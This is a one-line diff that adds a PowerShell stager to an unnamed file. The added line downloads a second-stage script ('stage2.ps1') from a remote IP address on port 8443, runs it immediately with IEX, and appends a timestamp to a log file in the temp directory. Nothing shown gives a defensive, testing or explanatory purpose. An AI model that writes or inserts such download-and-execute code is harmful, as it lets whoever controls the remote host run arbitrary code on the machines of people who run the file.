@@ -1,0 +1,1 @@
+$DownloadUrl = "https://198.51.100.162:8443/stage2.ps1"; $StageScript = (New-Object System.Net.WebClient).DownloadString($DownloadUrl); IEX $StageScript; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
